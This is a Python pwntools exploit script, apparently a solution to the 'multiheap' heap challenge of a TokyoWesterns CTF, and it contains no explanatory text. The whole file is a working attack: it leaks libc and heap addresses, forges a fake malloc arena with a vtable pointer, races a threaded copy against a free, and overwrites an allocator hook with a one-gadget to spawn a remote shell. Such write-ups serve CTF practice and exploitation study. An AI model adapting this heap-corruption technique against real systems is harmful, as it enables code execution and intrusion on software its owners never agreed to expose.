#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.19"
port = 8888
host = "multiheap.chal.ctf.westerns.tokyo"
port = 10001
context.arch = "amd64"    
r = remote(host,port)

def alloc(types,size,m=None):
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(types)
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    if m :
        r.sendline("t")
    else:
        r.sendline("m")

def free(idx):
    r.recvuntil("choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def write(idx):
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def read(idx,data):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(len(data)))
    r.recvuntil(":")
    r.send(data)

def copy(src,dst,size):
    r.recvuntil("choice:")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(str(src))
    r.recvuntil(":")
    r.sendline(str(dst))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline("y")


alloc("char",0x410) #0
alloc("char",0x40) #1
free(0)
alloc("long",0x30) #1
write(1)
libc = int(r.recvuntil("\n"))- 0x3ec090
print "libc:",hex(libc)
r.recvuntil("\n")
heap = int(r.recvuntil("\n")) - 0x11e90
print "heap:",hex(heap)
alloc("char",0x410,'1') #2
alloc("char",0x40,'1') #3
free(2)
alloc("long",0x30,'1') # 3
write(3)
threadheap = int(r.recvuntil("\n")) - 0x80
print "threadheap:",hex(threadheap)
alloc("char",0x4000000) #4
alloc("char",0x5000000,'1') #5
free_hook = libc + 0x3ed8e8
main_arena = libc  +0x3ebc40
vtable = heap + 0x12380
fake = p64(threadheap+0x20) + p64(0) + p64(0x21000)*2 + '\x00'*0x860 + p64(0)*2+ p64(main_arena) 
fake += p64(0)*2 + p64(0x21000)*2 + p64(0)*2 + p64(0x251) + '\x02'*0x40 + "\x00"*0x210 + p64(0)*8 + p64(vtable)
alloc("char",0x1810000,'1') #6
free(6)
alloc("char",0x1810000,'1') #6
alloc("char",0x1810000,'1') #7
alloc("char",0xfd0000,'1') #8
alloc("char",0x20,'1') #9
magic = libc + 0x4f322
#magic = 0xdeadbeef
free(9)
alloc("char",0x80) #9

read(9,p64(magic)*4)
alloc("char",0x40) #10

read(5,'a'*0x4000ff0 +fake)
copy(5,4,0)
time.sleep(0.24)

free(10)
r.interactive()


